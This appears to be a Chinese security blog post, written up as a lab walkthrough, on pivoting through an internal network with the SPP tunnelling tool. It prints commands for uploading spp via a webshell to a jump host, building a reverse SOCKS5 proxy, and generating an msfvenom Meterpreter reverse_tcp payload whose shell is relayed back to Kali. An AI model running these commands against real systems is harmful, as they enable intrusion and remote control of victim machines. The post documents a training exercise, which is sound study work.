@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        SPP端口转发-反向代理 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">SPP端口转发-反向代理</div>
+        <div class="post-info">
+          
+  <a href="/tags/SPP%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="post-tag">#SPP端口转发</a><a href="/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/" class="post-tag">#反向代理</a><a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="post-tag">#内网穿透</a>
+
+
+          <span class="post-date">2023-05-15</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+<p>下载地址 ： <a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684131948962-90016552-dd78-4e4a-8214-eb05affe3791.png#averageHue=%23fcfcfc&clientId=ueb85745a-e7a9-4&from=paste&height=572&id=u40969fe8&originHeight=1143&originWidth=2314&originalType=binary&ratio=2&rotation=0&showTitle=false&size=107510&status=done&style=none&taskId=uc770d7d6-d7bd-4a2d-93dd-461bea9a177&title=&width=1157" alt="image.png"><br>Kali:<br>启动服务端 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./spp -<span class="hljs-built_in">type</span> server -proto tcp -listen :<span class="hljs-number">8888</span> -proto ricmp -listen <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>      <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684132006583-46385eee-d933-44f7-89e6-21b6cef5ca20.png#averageHue=%2323252e&clientId=ueb85745a-e7a9-4&from=paste&height=425&id=u261d5404&originHeight=850&originWidth=1718&originalType=binary&ratio=2&rotation=0&showTitle=false&size=252969&status=done&style=none&taskId=u5150611a-6670-4fc4-b2e3-e57288893cc&title=&width=859" alt="image.png"></p>
+<p>WIN7 ：<br>通过webshell 上传spp <br>先搭建个反向socks5代理，进入内网</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./spp.exe -name <span class="hljs-string">&quot;16&quot;</span> -<span class="hljs-built_in">type</span> reverse_socks5_client -server <span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.130</span>:<span class="hljs-number">8888</span> -fromaddr :<span class="hljs-number">1080</span> -proxyproto tcp <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684132168292-78de18af-8499-445e-83c7-7838fdb0d979.png#averageHue=%23111111&clientId=ueb85745a-e7a9-4&from=paste&height=327&id=u01c80303&originHeight=653&originWidth=845&originalType=binary&ratio=2&rotation=0&showTitle=false&size=49598&status=done&style=none&taskId=u5258034c-6a43-408c-8650-090ed71e523&title=&width=422.5" alt="image.png"></p>
+<p>WIN2008 :<br>MSF生成木马文件，上传木马文件 shell.exe</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.143</span>  LPORT=<span class="hljs-number">8888</span> -f exe &gt; shell.exe<br><br></code></pre></td></tr></table></figure>
+<p>这里生成的IP是win7 跳板机的 8888端口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684132227531-57dc5631-ad3e-47f4-b2d2-c0eccf8f93b7.png#averageHue=%23f6f5f4&clientId=ueb85745a-e7a9-4&from=paste&height=381&id=uf44d157c&originHeight=761&originWidth=1266&originalType=binary&ratio=2&rotation=0&showTitle=false&size=52615&status=done&style=none&taskId=ue2aefbe7-1c35-44e1-a59b-fbad357dca0&title=&width=633" alt="image.png"><br>跳板机Win7运行spp tcp正向代理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./spp.exe -name <span class="hljs-string">&quot;shiliu&quot;</span> -<span class="hljs-built_in">type</span> proxy_client -server <span class="hljs-number">192.168</span><span class="hljs-number">.145</span><span class="hljs-number">.130</span>:<span class="hljs-number">8888</span> -fromaddr :<span class="hljs-number">8888</span> -toaddr :<span class="hljs-number">7777</span> -proxyproto tcp <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684132398407-9a8f5a97-9b43-4a09-bc80-e8f350e69b52.png#averageHue=%23121212&clientId=ueb85745a-e7a9-4&from=paste&height=693&id=u3b1672f0&originHeight=1385&originWidth=825&originalType=binary&ratio=2&rotation=0&showTitle=false&size=76871&status=done&style=none&taskId=u09c19b9b-d98c-4a72-a582-b45730821d1&title=&width=412.5" alt="image.png"></p>
+<p>Kali:<br>启动监听 </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684132463079-ee530716-f39d-4671-af33-0b8f8e47e7a6.png#averageHue=%23212530&clientId=ueb85745a-e7a9-4&from=paste&height=61&id=ub13922e3&originHeight=121&originWidth=875&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46095&status=done&style=none&taskId=u72a594a5-2e8f-4e8f-a2c6-aad4315f049&title=&width=437.5" alt="image.png"></p>
+<p>win2008 :<br>运行shell.exe <br>Kali 获取shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684132527122-1683cdd4-532d-41af-8ce6-fd74229004e6.png#averageHue=%23252a34&clientId=ueb85745a-e7a9-4&from=paste&height=685&id=u96ce3aa8&originHeight=1370&originWidth=1348&originalType=binary&ratio=2&rotation=0&showTitle=false&size=612514&status=done&style=none&taskId=uceb23c55-ec4f-4d42-a79b-4ec0398b501&title=&width=674" alt="image.png"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/17/ATT&CK(%E4%BA%8C)/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>ATT&CK红队评估(二)</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/05/12/Hacker_Kid/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      Hacker_kid
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/SPP%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="post-tag">#SPP端口转发</a><a href="/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/" class="post-tag">#反向代理</a><a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="post-tag">#内网穿透</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
